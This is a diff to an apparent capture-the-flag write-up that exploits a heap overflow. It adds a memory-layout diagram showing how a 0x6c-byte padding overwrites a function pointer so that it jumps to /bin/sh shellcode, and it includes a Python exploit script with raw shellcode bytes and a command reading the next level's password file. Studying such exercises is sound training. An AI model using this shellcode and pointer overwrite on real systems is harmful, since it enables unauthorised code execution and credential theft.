@@ -1,7 +1,7 @@
 ```py
 import struct
 
-padding = "A"*108
+padding = "A"*0x6c
 this00_func = 0x804a078
 
 exploit = struct.pack("I", this00_func)
@@ -9,6 +9,21 @@ exploit += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1
 
 print padding+exploit
 ```
+
+sizeof(this) = 0x6c
+this+0x6c = this00-4
+
+| this (size 0x6c) | |  this00 (size 0x6c)  |
+| func | buff | id | | func  |  buff   | id |
+|   4  |  100 |  4 |4|   4   |  100    | 4  |
+|      |AAAAAA|AAAA|A|804a078|shellcode|    |
+|      |     0x6c    |                      |
+
+writing "A"*6c at this->buf (this+4)
+writing this00->buff addr to this->func
+writing shellcode to this00->buff
+
+so when this00->func is call it execute shellcode at this->buff
 
 cat /home/user/bonus0/.pass
 
